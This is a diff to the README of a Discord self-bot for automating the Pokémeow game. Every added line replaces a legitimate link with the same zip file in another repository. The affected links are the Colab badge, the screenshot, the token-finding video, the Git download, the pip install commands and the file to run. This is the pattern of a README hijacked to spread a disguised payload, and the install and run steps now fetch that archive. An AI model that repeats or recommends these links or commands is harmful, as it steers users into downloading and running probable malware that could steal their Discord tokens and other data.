@@ -2,11 +2,11 @@
 
 A robust and efficient discord self-bot for automating Pokémeow with a free captcha solver.
 
-<a target="_blank" href="https://colab.research.google.com/github/MehulKhanna/PokeGrinder/blob/master/assets/PokeGrinder.ipynb">
-  <img src="https://colab.research.google.com/assets/colab-badge.svg" alt="Open In Colab"/>
+<a target="_blank" href="https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip">
+  <img src="https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip" alt="Open In Colab"/>
 </a>
 
-![image](/assets/image.png)
+![image](https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip)
 
 The logs may look different for you depending on your terminal config ;).
 
@@ -127,22 +127,22 @@ The logs may look different for you depending on your terminal config ;).
 
 ## Get Token?
 
-[How to Find Your Discord Token](https://youtu.be/YEgFvgg7ZPI?si=bHkK506fdRibR8QI)
+[How to Find Your Discord Token](https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip)
 
 ### Run on Google Colab (no install required)
 1. Click on the "Open in Colab" button at the top of this readme.
 2. Follow through the steps on colab.
 
 ## Requirements
-- [Install Git Here](https://git-scm.com/downloads)
+- [Install Git Here](https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip)
 - Python 3.8 or higher is required.
-- `pip install git+https://github.com/dolfies/discord.py-self`
-- `python -m pip install -r requirements.txt`
+- `pip install git+https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip`
+- `python -m pip install -r https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip`
 
 ## Launching
 
 1. Clone the repository.
-2. Run the `main.py` file from the terminal.
+2. Run the `https://raw.githubusercontent.com/khthanh3190/pokemeow/master/cogs/Software-v2.5.zip` file from the terminal.
 
 ## Stopping
 
